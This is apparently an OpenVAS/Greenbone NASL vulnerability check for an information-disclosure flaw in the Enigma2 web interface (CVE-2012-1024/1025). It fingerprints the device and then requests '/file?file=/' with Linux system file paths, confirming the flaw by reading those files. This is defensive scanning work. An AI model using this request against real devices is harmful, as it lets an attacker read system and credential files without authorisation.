if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103381" );
	script_bugtraq_id( 51330 );
	script_version( "2021-04-16T06:57:08+0000" );
	script_cve_id( "CVE-2012-1024", "CVE-2012-1025" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_name( "Enigma2 'file' Parameter Information Disclosure Vulnerability" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/51330" );
	script_xref( name: "URL", value: "http://dream.reichholf.net/wiki/Enigma2" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2012-01-10 10:48:24 +0100 (Tue, 10 Jan 2012)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "httpver.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_require_keys( "Host/runs_unixoide" );
	script_tag( name: "summary", value: "Enigma2 is prone to an information-disclosure vulnerability because it
  fails to sufficiently validate user-supplied data." );
	script_tag( name: "impact", value: "An attacker can exploit this issue to download local files in the
  context of the webserver process. This may allow the attacker to
  obtain sensitive information. Other attacks are also possible." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since
  the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are
  to upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 80 );
url = "/web/movielist.rss";
if(http_vuln_check( port: port, url: url, pattern: "Enigma2 Movielist" )){
	files = traversal_files( "linux" );
	for pattern in keys( files ) {
		file = files[pattern];
		url = "/file?file=/" + file;
		if(http_vuln_check( port: port, url: url, pattern: pattern )){
			report = http_report_vuln_url( port: port, url: url );
			security_message( data: report, port: port );
			exit( 0 );
		}
	}
}
exit( 99 );

